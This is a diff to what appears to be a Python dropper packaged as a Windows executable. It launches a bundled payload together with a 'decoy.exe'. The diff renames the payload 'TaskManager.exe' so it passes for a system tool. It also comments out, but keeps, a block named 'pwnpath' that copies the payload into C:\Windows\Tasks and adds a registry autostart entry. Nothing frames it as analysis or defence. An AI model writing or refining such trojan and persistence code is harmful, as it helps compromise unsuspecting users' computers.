@@ -9,6 +9,7 @@ import shutil
 import subprocess
 from pathlib import Path
 
+
 def resource_path(relative_path):
     base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
     return os.path.join(base_path, relative_path)
@@ -47,11 +48,12 @@ def check_autostart_registry(value_name):
                 break
     return False
 
-subprocess.Popen(resource_path('taskserv.exe'))
+subprocess.Popen(resource_path('TaskManager.exe'))
 subprocess.Popen(resource_path('decoy.exe'))
-pwnpath = r'C:\Windows\Tasks\taskserv.exe'
-ppath = Path(pwnpath)
-if not ppath.is_file():
-        shutil.copyfile(resource_path('taskserv.exe'), pwnpath)
-        set_autostart_registry('TaskServ', pwnpath)
+#
+#pwnpath = r'C:\Windows\Tasks\Task Manager.exe'
+#ppath = Path(pwnpath)
+#if not ppath.is_file():
+#        shutil.copyfile(resource_path('Task Manager.exe'), pwnpath)
+#        set_autostart_registry('TaskServ', pwnpath)
 
